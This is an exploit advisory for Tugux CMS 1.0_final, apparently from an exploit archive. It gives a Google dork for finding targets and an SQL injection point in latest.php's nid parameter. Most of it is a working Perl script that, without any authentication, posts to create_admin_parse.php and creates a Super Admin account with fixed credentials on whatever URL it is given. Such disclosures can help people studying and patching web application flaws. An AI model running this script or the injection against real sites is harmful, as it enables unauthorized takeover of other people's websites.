@@ -1,0 +1,76 @@
++----------------------------------------------+
+| Tugux CMS 1.0_final Multiple Vulnerabilities |
++----------------------------------------------+
+  
+Vulnerable Web-App : Tugux CMS 1.0_final
+Vulnerability      : Multiple Vulnerabilities.
+Author             : Aodrulez. (Atul Alex Cherian)
+Email              : f3arm3d3ar@gmail.com
+Google-Dork        : "Copyright 2010-2011 Tugux CMS"
+Tested on          : Ubuntu 10.04
+Web-App            : http://sourceforge.net/projects/tuguxcms/
+ 
+ 
++---------+
+| Details |
++---------+
+
+1] SQLi 
+Exploit : http://localhost/latest.php?nid=9'[sqli]
+
+2] "create_admin_parse.php"
+Vulnerability : Can be used to add Super Admin Accounts without
+                any authentication. :)
+
+
+
++--------------------+
+| Exploit (Perl Code)|
++--------------------+
+(This Exploit will Add 
+a new Super Admin Account)
+
+use HTTP::Request::Common qw(POST);
+use LWP::UserAgent;
+use LWP 5.64;
+my $browser = LWP::UserAgent->new();
+my $url=$ARGV[0];
+print "+----------------------------------------+\n";
+print "| Tugux CMS 1.0 Multiple Vulnerabilities |\n";
+print "+----------------------------------------+\n\n";
+print "Author             : Aodrulez.\n";
+print "Email              : f3arm3d3ar\@gmail.com\n";
+print "Google-Dork        : \"Copyright 2010-2011 Tugux CMS\"\n";
+if(!$url)
+{die ("\nPlease enter the target url. Ex. perl $0 http://www.test.com");}
+my $exploit='/administrator/create_admin_parse.php';
+print "\n[+] Creating a new Super Admin \\m/";
+$response = HTTP::Request->new(POST => $url.$exploit) or die("\n Connection Error!");
+$response->content_type("application/x-www-form-urlencoded");
+$response->content("username=Aodrulez&pass1=aod&type=a");
+my $data=$browser->request($response)->as_string;
+if($data!~m/HTTP\/1.1 200 OK/){ die ("\n$url Not Vulnerable!\n");}
+print "\n[!] Admin Username : Aodrulez\n[!] Admin Password : aod\n[!] Type : Super Admin.\n";
+
+
+
++-------------------+
+| Greetz Fly Out To |
++-------------------+
+   
+  
+1] Amforked()          : My Mentor.
+2] The Blue Genius     : My Boss.
+3] str0ke (milw0rm)
+4] www.orchidseven.com
+5] www.malcon.org
+6] www.isac.org.in
+ 
+ 
++-------+
+| Quote |
++-------+
+ 
+"FREEDOM! FOREVER!" - Aodrulez
+
+
